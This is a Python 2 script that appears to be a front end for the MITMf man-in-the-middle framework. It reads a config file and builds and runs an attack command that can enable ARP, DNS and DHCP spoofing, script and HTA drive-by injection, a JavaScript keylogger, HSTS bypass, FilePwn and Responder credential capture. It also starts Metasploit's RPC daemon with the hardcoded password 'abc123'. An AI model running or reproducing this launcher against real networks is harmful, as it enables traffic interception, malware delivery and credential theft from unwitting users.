import eznhlib, re
bash_cmd = eznhlib.bash_cmd
get_gw = eznhlib.get_gw
readUserInput = eznhlib.readUserInput
menu_parser = eznhlib.menu_parser
popen_background = eznhlib.popen_background
clean_iptables = eznhlib.clean_iptables

config_file = "mitmf.cfg"

def readToLines(config_file):
    r = popen_background("cat mitmf.cfg  | grep -vi \#")
    print str(r)
    l = r.splitlines()
    return l

def getProxyARPiface1(config_file):
    lines = readToLines(config_file)
    for line in lines:
        if re.search("NETIFACE_ONE",line):
            i = line.split(" = ")
            iface1 = str(i[1])
    return iface1

def getProxyARPiface2(config_file):
    lines = readToLines(config_file)
    for line in lines:
        if re.search("NETIFACE_TWO",line):
            i = line.split(" = ")
            iface2 = str(i[1])
    return iface2

def togglePARPDebugMode(lines, c):
    for line in lines:
        if re.search("PARP_DEBUG_MODE",line):
            i = line.split(" = ")
            if i[1] == "1":
                c = c + " -d"
                print str(c)
            else:
                pass
    return c
def startProxyARP(cmd):
    lines = readToLines(config_file)
    c = "parprouted"
    iface1 = getProxyARPiface1(config_file)
    iface2 = getProxyARPiface2(config_file)
    c = togglePARPDebugMode(lines, c)
    for line in lines:
        if re.search("PROXY_ARP_MODE", line):
            s = line.split(" = ")
            if s[1] == "1":
                c = c + " {} {} &".format(str(iface1),str(iface2))
                bash_cmd(c)
                print str(c)
    return cmd
def readConfig(config_file):
    cmd = "mitmf"
    # f = open(config_file,'r')
    # r = f.read()
    # l = r.splitlines()
    r = popen_background("cat mitmf.cfg  | grep -vi \#")
    print str(r)
    l = r.splitlines()
    for line in l:
        if re.search("INTERFACE", line):
            s = line.split(" = ")
            iface = s[1]
            cmd = cmd + " -i {}".format(str(iface))
            print cmd
        if re.search("INJECT", line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --inject"
        if re.search("JS_URL", line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --js-url {}".format(str(s[1]))
        if re.search("HTML_URL",line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --html-url {}".format(str(s[1]))
        if re.search("HTA_DRIVEBY",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --hta"
        if re.search("HTA_TEXT",line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --text {}".format(str(s[1]))
        if re.search("HTA_APP",line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --hta-app {}".format(str(s[1]))
        if re.search("SPOOF",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --spoof"
        if re.search("SPOOF_TYPE",line):
            s = line.split(" = ")
            if s[1] != "":
                if s[1] == "ARP":
                    cmd = cmd + " --arp"
                if s[1] == "DNS":
                    cmd = cmd + " --dns"
                if s[1] == "DHCP":
                    cmd = cmd + " --dhcp"
                if s[1] == "ICMP":
                    cmd = cmd + " --icmp"
        if re.search("AUTO_ACQUIRE_GATEWAY",line):
            s = line.split(" = ")
            if s[1] == "1":
                gw = get_gw()
                cmd = cmd + " --gateway {}".format(str(gw))
            else:
                for line in l:
                    if re.search("SPOOF_GATEWAY",line):
                        s = line.split(" = ")
                        if s[1] != "":
                            cmd = cmd + " --gateway {}".format(str(s[1]))
        if re.search("SPOOF_TARGET",line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --targets {}".format(str(s[1]))
        if re.search("APP_POISON",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --appoison"
        if re.search("UPSIDEDOWN_INTERNET",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --upsidedownternet"
        if re.search("BROWSER_PROFILER",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --browserprofiler"
        if re.search("FILEPWN",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --filepwn"
        if re.search("SMB_AUTH",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --smbauth"
        if re.search("FERRET_NG",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --ferretng"
        if re.search("FERRET_NG_PORT",line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --port {}".format(str(s[1]))
        if re.search("FERRET_NG_COOKIES",line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --load-cookies {}".format(str(s[1]))
        if re.search("BROWSER_SNIPER",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --browsersniper"
        if re.search("JS_KEYLOGGER",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --jskeylogger"
        if re.search("""REPLACE""",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --replace"
        if re.search("HSTS",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --hsts"
        if re.search("RESPONDER_PLUGIN",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --responder"
        if re.search("RESPONDER_ANALYZE",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --analyze"
        if re.search("RESPONDER_WREDIR",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --wredir"
        if re.search("RESPONDER_NBTNS",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --nbtns"
        if re.search("RESPONDER_FINGERPRINT",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --fingerprint"
        if re.search("RESPONDER_LM",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --lm"
        if re.search("RESPONDER_WPAD",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --wpad"
        if re.search("RESPONDER_FORCE_WPADAUTH",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --forcewpadauth"
    cmd = startProxyARP(cmd)
    print str(cmd)
    startAttack(cmd)
    return cmd

def startMsfrpcd():
    bash_cmd("msfrpcd -U msf -P abc123 -a 127.0.0.1 -p 55552")
    return
def startAttack(cmd):
    if re.search("browsersniper", cmd):
        startMsfrpcd()
    if re.search("filepwn", cmd):
        startMsfrpcd()
    bash_cmd(cmd)
    return

def main():
    print """
    \r\n\t1:\tStart Attack with the configuration settings settings settings set
    \r\n\t2:\tStop the Attack
    """
    userInput = int(raw_input("Enter a option: "))
    if userInput == 1:
        readConfig(config_file)
    elif userInput == 2:
        cmd = "fuser -k 55552/tcp 55553/tcp 587/tcp 110/tcp 9999/tcp 143/tcp 80/tcp 10000/tcp 21/tcp 88/tcp 25/tcp 1433/tcp 445/tcp 3141/tcp 389/tcp;pkill parprouted"
        bash_cmd(cmd)
    else:
        print "You have entered a invalid option"
        main(n)
    return
main()
